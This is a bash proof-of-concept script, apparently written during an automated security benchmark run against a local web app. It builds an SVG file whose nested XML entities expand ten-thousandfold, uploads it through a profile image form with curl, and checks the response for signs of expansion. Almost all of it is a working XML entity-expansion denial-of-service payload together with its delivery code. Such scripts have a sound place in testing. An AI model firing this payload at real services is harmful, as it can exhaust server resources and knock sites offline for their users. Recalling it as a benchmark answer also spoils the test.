#!/bin/bash
# POC: XXE Billion Laughs DoS attack via SVG file upload with recursive entity expansion - Version 2
# Target: ./repo
# Created: 2025-11-07T21:56:01.081Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# XXE Billion Laughs DoS Attack POC - Version 2
# This script creates a malicious SVG with nested XML entity definitions
# that expand exponentially when processed by the XML parser

TARGET_URL="${1:-http://localhost:3000}"

# Try multiple possible endpoints
ENDPOINTS=(
    "/upload"
    "/api/upload"
    "/profile/upload"
    "/user/profile"
    "/"
)

# Create temporary directory for POC
POC_DIR="/tmp/xxe_poc_$$"
mkdir -p "$POC_DIR"

# Create the billion laughs SVG payload
create_billion_laughs_svg() {
    local output_file="$1"
    
    cat > "$output_file" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="400">
  <text x="10" y="20" font-size="14">&lol5;</text>
</svg>
EOF
}

# Create the malicious SVG
MALICIOUS_SVG="$POC_DIR/xxe_billionlaughs.svg"
create_billion_laughs_svg "$MALICIOUS_SVG"

echo "[*] XXE Billion Laughs DoS Attack POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Malicious SVG payload created"
echo ""

# Display payload information
echo "[*] Payload structure:"
echo "    Level 1 (lol):  1 repetition = 1x"
echo "    Level 2 (lol2): 10x lol = 10x"
echo "    Level 3 (lol3): 10x lol2 = 100x"
echo "    Level 4 (lol4): 10x lol3 = 1,000x"
echo "    Level 5 (lol5): 10x lol4 = 10,000x"
echo "    Total expansion: 10^5 = 100,000x multiplication"
echo ""

# Try the attack using curl directly to root endpoint
echo "[*] Sending malicious SVG with multipart form data..."
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -F "name=Test" \
  -F "surname=User" \
  -F "address=123 Main St" \
  -F "image=@$MALICIOUS_SVG" \
  "$TARGET_URL" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Check for successful exploitation
if echo "$BODY" | grep -q "lol"; then
    echo "[+] VULNERABLE: Server expanded XML entities in response"
    echo "[+] Entity expansion detected in response body"
    
    # Count occurrences of "lol" to verify expansion
    LOL_COUNT=$(echo "$BODY" | grep -o "lol" | wc -l)
    echo "[+] 'lol' string appears $LOL_COUNT times in response"
    echo ""
    
    if [ "$LOL_COUNT" -gt 100 ]; then
        echo "[+] CONFIRMED: Significant entity expansion occurred (>100 repetitions)"
        echo "[+] This indicates the server is vulnerable to billion laughs attacks"
        echo ""
        echo "[*] Vulnerability confirmed: The XML parser expanded recursive entities"
        echo "[*] An attacker could consume server resources and cause DoS"
    fi
elif [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
    echo "[+] Server accepted the malicious SVG (HTTP $HTTP_CODE)"
    echo "[+] This indicates the server processed the XML entity definitions"
    echo ""
    echo "[*] Vulnerability likely present: Server accepted malicious entity definitions"
    echo "[*] An attacker could send billion laughs payloads to cause DoS"
else
    echo "[!] Server responded with HTTP $HTTP_CODE"
    echo "[!] Entity expansion may have been blocked, sanitized, or endpoint not found"
fi

# Show response headers and body sample
echo ""
echo "[*] Response body sample (first 500 chars):"
echo "$BODY" | head -c 500
echo ""
echo ""

# Cleanup
rm -rf "$POC_DIR"

echo "[*] POC complete"